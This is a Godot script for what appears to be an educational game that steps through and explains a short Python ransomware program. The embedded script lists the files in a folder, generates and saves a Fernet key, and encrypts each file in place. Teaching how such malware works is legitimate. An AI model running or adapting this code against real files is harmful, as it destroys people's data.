extends MarginContainer


@onready var code_edit: CodeEdit = $HSplitContainer/CodeEdit
@onready var overlay: ColorRect = $HSplitContainer/CodeEdit/Overlay
@onready var rich_text_label: RichTextLabel = $HSplitContainer/HFlowContainer/RichTextLabel

@export var back_button: Button
@export var animation : AnimationPlayer

var step: int = 0
var ransomware_code = {
	"step_1" : "import os\nfrom cryptography.fernet import Fernet",
	"step_2": "allfiles = []\nfor file in os.listdir():\n\tif file == 'malware.py' or file == 'key.key' or file == 'decr.py':\n\t\tcontinue\n\tif os.path.isfile(file):\n\t\tallfiles.append(file)\nprint(allfiles)\n\n",
	"step_3": "key = Fernet.generate_key()\nwith open('key.key', 'wb') as thekey:\n\tthekey.write(key)\n\n",
	"step_4": "for file in allfiles:\n\twith open(file, 'rb') as thefile:\n\t\tcontent = thefile.read()\n\tcontent_encryp = Fernet(key).encrypt(content)\n\twith open(file, 'wb') as thefile:\n\t\tthefile.write(content_encryp)\n\n",
	"step_5": "print('All your files have been encrypted')\n",
	
}
func _ready() -> void:
	back_button.disabled = true
	code_edit.text = ""
	overlay.visible = false 
	rich_text_label.text = "this program collects files in a folder, creates a secret key, saves that key, and then encrypts the files so they cannot be read without the key."
	

func _on_back_button_down() -> void:
	# TODO: Set limits on back and next
	if step > 0:
		step -= 1
		set_step(step)
		back_button.disabled = false
	if step == 0:
		set_step(step)
		back_button.disabled = true

func _on_next_button_down() -> void:
	back_button.disabled = false
	step += 1
	set_step(step)

func set_step(step: int) -> void:

	
	match step:
		1:
			overlay.visible = true
			code_edit.text = ransomware_code.step_1
			rich_text_label.text = "First, the program imports two tools: os, which lets it interact with the computer’s files and folders, and Fernet from the cryptography library, which is used to lock (encrypt) and unlock (decrypt) data with a secret key."
			animation.play("decrypt_ransomware_step1")
		2:
			code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2
			rich_text_label.text = "This part creates an empty list called allfiles, which will store the names of files to be encrypted. The for loop goes through each item in the current directory using os.listdir(). If the file is named malware, key.key, or decr, it is skipped using the continue statement. This ensures the program does not encrypt itself, the secret key file, or a potential decryption file. The next if statement checks whether the item is actually a file (not a folder). If it is, the file name is added to the allfiles list. Finally, print(allfiles) displays the collected files."
			animation.play("encrypt_ransomware_step2")
		3:
			code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2 + ransomware_code.step_3
			rich_text_label.text = "This section generates a secret encryption key using Fernet.generate_key(). This key is essential because it is required to encrypt and later decrypt the files. The with open statement creates a new file called key.key in binary write mode ('wb') and saves the generated key into it. By storing the key in a separate file, the program ensures it can be retrieved later when decryption is needed."
			animation.play("encrypt_ransomware_step3")
		4:
			code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2  + ransomware_code.step_3 + ransomware_code.step_4
			rich_text_label.text = "This loop processes each file stored in the allfiles list. For every file, it first opens the file in binary read mode ('rb') and reads its contents. That data is then encrypted using the Fernet key, which scrambles the contents into an unreadable form. The encrypted version (content_encryp) is then written back to the same file in binary write mode ('wb'), replacing the original readable content. After this step, the file is fully encrypted and cannot be opened normally without the secret key."
			animation.play("encrypt_ransomware_step4")
		5:
			code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2  + ransomware_code.step_3 + ransomware_code.step_4 + ransomware_code.step_5
			rich_text_label.text = "Finally, the program prints a message to confirm that all the files have been encrypted.”"
			animation.play("encrypt_ransomware_step5")
		6: 
			rich_text_label.text = "Now we will run the code and generate a key. Exit the window when done"
			animation.play("RansomwareRun")
